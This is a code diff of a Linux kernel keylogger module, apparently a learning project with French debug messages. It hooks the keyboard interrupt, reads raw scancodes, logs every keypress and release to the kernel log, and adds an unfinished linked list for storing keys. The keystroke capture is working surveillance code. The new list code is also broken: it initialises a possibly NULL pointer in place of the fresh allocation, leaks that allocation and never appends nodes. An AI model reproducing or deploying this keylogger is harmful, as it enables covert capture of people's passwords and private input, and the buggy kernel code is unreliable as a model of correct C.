@@ -9,8 +9,7 @@ MODULE_DESCRIPTION("Module keylog");
 static ssize_t	key_write(struct file *filep, const char *buffer, size_t len, loff_t *offset);
 static ssize_t	key_read(struct file *filep, char *buffer, size_t len, loff_t *offset);
 
-struct dentry		*dir_entry, *file_entry;
-//static unsigned short	kbd_buffer = 0x0000;
+t_keylst	*k_lst = NULL;
 
 static ssize_t	key_write(struct file *filep, const char *buffer, size_t len, loff_t *offset)
 {
@@ -37,61 +36,77 @@ static struct miscdevice	key_dev = {
         .fops = &key_ops
 };
 
-static int		create_dir(void)
+t_keylst		*find_last_list_element(t_keylst *full_lst)
 {
-	dir_entry = debugfs_create_dir(PATH, NULL);
-	if (dir_entry == ERR_PTR(-ENODEV))
+	t_keylst	*tmp_lst;
+	int	i = 0;
+	tmp_lst = full_lst;
+	while (tmp_lst != NULL)
 	{
-		printk(KERN_INFO "failed create debugfs, CONFIG_DEBUG_FS have to be set yes\n");
-		return 0;
+		printk(KERN_INFO "i -> [%d]", i);
+		tmp_lst = tmp_lst->next;
+		i++;
 	}
-	else if (dir_entry == NULL)
-	{
-		printk(KERN_INFO "dir_entry is NULL in create_dir\n");
-		return 0;
-	}
-	printk(KERN_INFO "dir_entry have been successfully created\n");
-	return 1;
+	return tmp_lst;
 }
 
-static int		create_file(const char *name, umode_t mode, struct file_operations *fops)
+t_keylst		*init_node(t_keylst *node)
 {
-	file_entry = debugfs_create_file(name, mode, dir_entry, NULL, fops);
-	if (file_entry == NULL)
+	node->key = 'q';
+	node->state = 'a';
+	node->value = 1;
+	node->name[0] = "h";
+//	node->time = NULL;
+	node->next = NULL;
+	return node;
+}
+
+int			add_to_list(unsigned char scancode)
+{
+	t_keylst	*tmp_lst;
+	t_keylst	*new_node;
+
+	if (!(new_node = (t_keylst *)kmalloc(sizeof(t_keylst), GFP_KERNEL)))
+		return 1;
+	new_node = init_node(k_lst);
+	if (k_lst == NULL)
 	{
-		printk(KERN_INFO "file creation failed\n");
-		return 0;
+		printk(KERN_INFO "list est NULL\n");
+		printk(KERN_INFO "premier malloc a marcheeeeeeeeeeee\n");
+		k_lst = new_node;
+		k_lst->next = NULL;
 	}
-	printk(KERN_INFO "[%s] file have been well created\n", name);
-	return 1;
+	else
+	{
+		printk(KERN_INFO "dans le else du  malloc qui a marcheeeeeeeeeeee\n");
+		tmp_lst = k_lst;
+		tmp_lst = find_last_list_element(tmp_lst);
+		tmp_lst = new_node;
+		tmp_lst->next = NULL;
+	}
+	printk(KERN_INFO "[%d]\n", scancode & KBD_STATUS_MASK);
+	return 0;
 }
 
 static irqreturn_t 	kbd_irq_handler(int irq, void* dev_id)
 {
 	unsigned char /*status, */scancode;
 
-//	status = inb(KEYBOARD_STATUS);
 	scancode = inb(KEYBOARD_DATA);
-//	kbd_buffer = (unsigned short) ((status << 8) | (scancode & 0x00ff));
 	printk(KERN_INFO "Scan Code %c %s\n",
             keyboard_map[scancode & KBD_SCANCODE_MASK],
             scancode & KBD_STATUS_MASK ? "Released" : "Pressed");
+	if (add_to_list(scancode))
+	{
+		printk(KERN_INFO "kmalloc failed\n");
+		return 1;
+	}
 	return IRQ_HANDLED;
 }
 
 static int		__init keylogger_init(void)
 {
 	printk(KERN_INFO "in keylogger init function \n");
-	if (create_dir() != 1)
-	{
-		printk(KERN_INFO "creation directory failed\n");
-		return 1;
-	}
-	if (create_file("keylogs", 0660, &key_ops) != 1)
-	{
-		printk(KERN_INFO "file creation failed \n");
-		return 1;
-	}
 	if (misc_register(&key_dev))
 		return 1;
 	printk(KERN_INFO "keylogger: name [%s] minor  [%i]\n", key_dev.name, key_dev.minor);
@@ -107,7 +122,6 @@ static void		__exit keylogger_exit(void)
 {
 	printk(KERN_INFO "exit keylogger\n");
 	free_irq(KBD_IRQ, (void *)kbd_irq_handler);
-	debugfs_remove_recursive(dir_entry);
 	misc_deregister(&key_dev);
 }
 
